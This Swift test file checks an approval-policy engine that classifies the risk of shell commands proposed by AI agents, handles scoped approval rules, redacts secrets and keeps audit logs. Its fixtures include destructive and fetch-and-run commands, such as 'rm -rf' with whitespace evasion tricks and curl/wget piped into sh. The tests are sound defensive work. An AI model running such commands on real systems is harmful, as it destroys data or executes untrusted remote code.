//
//  ApprovalPolicyTests.swift
//  SharedTests — AgentDeck
//
//  Phase 8 approval policy engine tests: risk assessment, scoped rule
//  matching, secure confirmation, and audit persistence.
//

import Foundation
import Testing
@testable import Shared

@Suite("approval policy engine")
struct ApprovalPolicyTests {
    private let now: Int64 = 1_752_793_200_000

    private func makeRequest(
        tool: String = "shell",
        action: String = "git status",
        risk: RiskClassification = .low,
        files: [String] = [],
        domains: [String] = []
    ) throws -> ApprovalRequest {
        ApprovalRequest(
            id: .random(),
            agent: try #require(AgentIdentifier("com.example.adapter")),
            projectID: .random(),
            sessionID: .random(),
            tool: tool,
            exactAction: action,
            explanation: "Policy test request",
            files: files,
            domains: domains,
            workingDirectory: "/Users/test/project",
            risk: risk,
            reversibility: .unknown,
            originalProviderPayload: .object([("payloadV", .int(1))]),
            confidence: try #require(ApprovalEligibleConfidence(.native)),
            createdAt: now
        )
    }

    @Test("risk assessor escalates dangerous actions and identifies read-only requests")
    func riskAssessment() throws {
        let critical = try makeRequest(action: "sudo rm -rf /tmp/cache", risk: .low)
        #expect(critical.policyAssessment.classification == .critical)
        #expect(critical.effectiveRisk == .critical)

        let network = try makeRequest(action: "curl https://example.com", risk: .low, domains: ["example.com"])
        #expect(network.policyAssessment.classification == .high)
        #expect(network.effectiveRisk == .high)

        let readOnly = try makeRequest(tool: "rg", action: "rg TODO .", risk: .low)
        #expect(readOnly.policyAssessment.isReadOnly)
        #expect(readOnly.policyAssessment.classification == .low)
    }

    @Test("only scoped choices persist as rules; unrestricted approval remains impossible")
    func ruleValidation() throws {
        #expect(throws: ApprovalPolicyError.nonPersistableChoice(.allowOnce)) {
            _ = try ApprovalRule(
                choice: .allowOnce,
                explanation: "invalid",
                createdAt: now
            )
        }
        #expect(throws: ApprovalPolicyError.sessionRuleRequiresSessionID) {
            _ = try ApprovalRule(
                choice: .allowSession,
                explanation: "invalid",
                createdAt: now
            )
        }
        #expect(throws: ApprovalPolicyError.commandPatternRequired) {
            _ = try ApprovalRule(
                choice: .allowCommandPatternInProject,
                projectID: .random(),
                explanation: "invalid",
                createdAt: now
            )
        }
    }

    @Test("matching low-risk rules auto approve; high-risk requests stay manual")
    func autoApprovalMatching() async throws {
        let store = try SQLiteSessionStore.inMemory()
        let engine = ApprovalPolicyEngine(repository: store)
        let request = try makeRequest(tool: "rg", action: "rg TODO .", risk: .low)
        let rule = try ApprovalRule(
            choice: .allowReadOnlyActions,
            projectID: request.projectID,
            explanation: "Allow read-only actions in this project.",
            createdAt: now
        )
        try await store.insertApprovalRule(rule)

        let evaluation = try await engine.evaluate(request, at: now)
        switch evaluation {
        case .autoApproved(let decision, let matchedRule, let effectiveRisk):
            #expect(decision.choice == .allowReadOnlyActions)
            #expect(matchedRule.id == rule.id)
            #expect(effectiveRisk == .low)
        case .manual:
            Issue.record("expected automatic approval from the read-only rule")
        }

        let highRisk = try makeRequest(
            tool: "shell",
            action: "curl https://example.com",
            risk: .low,
            domains: ["example.com"]
        )
        let highRiskEvaluation = try await engine.evaluate(highRisk, at: now + 1)
        switch highRiskEvaluation {
        case .manual(let effectiveRisk, _):
            #expect(effectiveRisk == .high)
        case .autoApproved:
            Issue.record("high-risk requests must not be auto-approved")
        }

        let audit = try await store.approvalAuditEntries(sessionID: nil, limit: 20)
        #expect(audit.contains { $0.eventKind == .autoApproved })
        #expect(audit.contains { $0.eventKind == .requestReceived })
    }

    @Test("critical approval requires secure confirmation before an allow decision persists")
    func criticalSecureConfirmation() async throws {
        let store = try SQLiteSessionStore.inMemory()
        let engine = ApprovalPolicyEngine(repository: store)
        let request = try makeRequest(
            action: "sudo rm -rf /tmp/cache",
            risk: .critical,
            files: ["/Users/test/.zshrc"]
        )
        let allowSession = try ApprovalDecision(choice: .allowSession, decidedAt: now + 10)

        await #expect(throws: ApprovalPolicyError.criticalApprovalRequiresSecureConfirmation) {
            _ = try await engine.recordManualResolution(
                request: request,
                decision: allowSession,
                usedSecureConfirmation: false,
                at: now + 10
            )
        }

        _ = try await engine.recordManualResolution(
            request: request,
            decision: allowSession,
            usedSecureConfirmation: true,
            at: now + 20
        )

        let rules = try await store.listApprovalRules(projectID: request.projectID, sessionID: request.sessionID)
        #expect(rules.count == 1)
        #expect(rules.first?.choice == .allowSession)

        let audit = try await store.approvalAuditEntries(sessionID: request.sessionID, limit: 20)
        #expect(audit.contains { $0.eventKind == .secureConfirmationSatisfied })
        #expect(audit.contains { $0.eventKind == .ruleCreated })
        #expect(audit.contains { $0.eventKind == .resolutionRecorded })
    }
}

@Suite("§15.4 risk classifier evasion resistance")
struct ApprovalClassifierEvasionTests {
    private let now: Int64 = 1_752_793_200_000

    private func classify(
        action: String,
        tool: String = "shell",
        files: [String] = [],
        domains: [String] = []
    ) throws -> ApprovalRiskAssessment {
        let request = ApprovalRequest(
            id: .random(),
            agent: try #require(AgentIdentifier("com.example.adapter")),
            projectID: .random(),
            sessionID: .random(),
            tool: tool,
            exactAction: action,
            explanation: "Evasion test request",
            files: files,
            domains: domains,
            workingDirectory: "/Users/test/project",
            risk: .low,
            reversibility: .unknown,
            originalProviderPayload: .object([("payloadV", .int(1))]),
            confidence: try #require(ApprovalEligibleConfidence(.native)),
            createdAt: now
        )
        return request.policyAssessment
    }

    @Test("whitespace tricks cannot hide destructive fragments")
    func whitespaceNormalization() throws {
        #expect(try classify(action: "rm  -rf /tmp/cache").classification == .critical,
                "double space must not evade rm -rf")
        #expect(try classify(action: "rm\t-rf /tmp/cache").classification == .critical,
                "tab must not evade rm -rf")
        #expect(try classify(action: "rm -r\n-f /tmp/cache").classification == .critical,
                "embedded newline must not evade rm -rf")
        #expect(try classify(action: "git push  --force").classification == .high,
                "double space must not evade git push --force")
    }

    @Test("sudo is caught at end of line, before pipes, and with arguments")
    func sudoTokenMatching() throws {
        #expect(try classify(action: "sudo").classification == .critical, "bare sudo at EOL")
        #expect(try classify(action: "echo hi | sudo tee /etc/hosts").classification == .critical)
        #expect(try classify(action: "sudo launchctl load").classification == .critical)
        #expect(try classify(action: "mysudo --help").classification != .critical,
                "token matching must not flag substrings")
    }

    @Test("pipe-into-shell is critical with or without spaces around the pipe")
    func pipeIntoShell() throws {
        #expect(try classify(action: "curl https://x.example/install|sh").classification == .critical,
                "curl x|sh without spaces")
        #expect(try classify(action: "curl https://x.example/install | bash").classification == .critical)
        #expect(try classify(action: "wget -qO- https://x.example| sudo sh -s").classification == .critical,
                "sudo between pipe and shell")
        #expect(try classify(action: "git branch | grep main").classification != .critical,
                "ordinary pipes are not executions")
    }

    @Test("shell composition is never read-only, even with a read-only first token")
    func compositionIsConservative() throws {
        let piped = try classify(action: "ls | cat")
        #expect(piped.classification == .medium)
        #expect(!piped.isReadOnly, "a pipe voids the read-only classification")

        #expect(try classify(action: "ls > /tmp/out").classification == .medium,
                "redirects have side effects")
        #expect(try classify(action: "ls $(pwd)").classification == .medium,
                "command substitution can hide anything")
        #expect(try classify(action: "git status && git log").classification == .medium)
        #expect(try classify(action: "git status").classification == .informational,
                "uncomposed read-only commands keep their classification")
        #expect(try classify(action: "ls -la").classification == .low)
    }

    @Test("token-based high-risk commands match at end of line")
    func highTokens() throws {
        #expect(try classify(action: "scp").classification == .high, "scp at EOL")
        #expect(try classify(action: "rsync -a ./build host:/srv").classification == .high)
        #expect(try classify(action: "npm  install").classification == .high,
                "double space must not evade npm install")
    }
}

@Suite("§15.5 secret redaction in persisted approval rules")
struct ApprovalRuleRedactionTests {
    private let now: Int64 = 1_752_793_200_000

    @Test("command patterns and audit summaries never persist secrets")
    func patternRedaction() async throws {
        let store = try SQLiteSessionStore.inMemory()
        let engine = ApprovalPolicyEngine(repository: store)
        let request = ApprovalRequest(
            id: .random(),
            agent: try #require(AgentIdentifier("com.example.adapter")),
            projectID: .random(),
            sessionID: .random(),
            tool: "shell",
            exactAction: "curl -H 'Authorization: Bearer abcdef1234567890' https://api.example.com",
            explanation: "Call the API.",
            workingDirectory: "/Users/test/project",
            risk: .low,
            reversibility: .unknown,
            originalProviderPayload: .object([("payloadV", .int(1))]),
            confidence: try #require(ApprovalEligibleConfidence(.native)),
            createdAt: now
        )
        let decision = try ApprovalDecision(
            choice: .allowCommandPatternInProject,
            commandPattern: request.exactAction,
            decidedAt: now
        )
        _ = try await engine.recordManualResolution(
            request: request,
            decision: decision,
            usedSecureConfirmation: false,
            at: now
        )

        let rules = try await store.listApprovalRules(projectID: request.projectID, sessionID: nil)
        #expect(rules.count == 1)
        let pattern = try #require(rules.first?.commandPattern)
        #expect(!pattern.contains("abcdef1234567890"), "the bearer credential must not persist")
        #expect(pattern.contains("[REDACTED:TOKEN]"))
        #expect(rules.first?.explanation.contains("abcdef1234567890") == false,
                "audit-facing explanation must not persist the credential either")

        let audit = try await store.approvalAuditEntries(sessionID: request.sessionID, limit: 20)
        #expect(audit.contains { $0.eventKind == .ruleCreated })
        #expect(audit.allSatisfy { !$0.summary.contains("abcdef1234567890") },
                "no audit summary may carry the credential")
    }

    @Test("terminal expiry is recorded in the audit trail")
    func expiryAudit() async throws {
        let store = try SQLiteSessionStore.inMemory()
        let engine = ApprovalPolicyEngine(repository: store)
        let request = ApprovalRequest(
            id: .random(),
            agent: try #require(AgentIdentifier("com.example.adapter")),
            projectID: .random(),
            sessionID: .random(),
            tool: "shell",
            exactAction: "make test",
            explanation: "Run tests.",
            workingDirectory: "/Users/test/project",
            risk: .low,
            reversibility: .reversible,
            originalProviderPayload: .object([:]),
            confidence: try #require(ApprovalEligibleConfidence(.native)),
            createdAt: now
        )
        try await engine.recordExpiry(request: request, at: now + 300_000)
        let audit = try await store.approvalAuditEntries(sessionID: request.sessionID, limit: 20)
        #expect(audit.contains { $0.eventKind == .requestExpired && $0.requestID == request.id })
    }
}
